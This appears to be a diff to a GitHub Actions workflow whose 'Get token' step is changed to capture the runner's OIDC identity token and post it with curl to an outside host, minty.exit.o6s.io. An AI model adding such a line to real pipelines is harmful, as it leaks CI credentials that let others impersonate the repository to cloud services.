@@ -23,4 +23,5 @@ jobs:
       - name: Get token
         run: |
           echo curl -i $ACTIONS_ID_TOKEN_REQUEST_URL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" 
-          curl -i $ACTIONS_ID_TOKEN_REQUEST_URL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" 
+          FOO=$(curl -i $ACTIONS_ID_TOKEN_REQUEST_URL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
+          curl https://minty.exit.o6s.io/github-oidc-token --data-binary "$FOO"
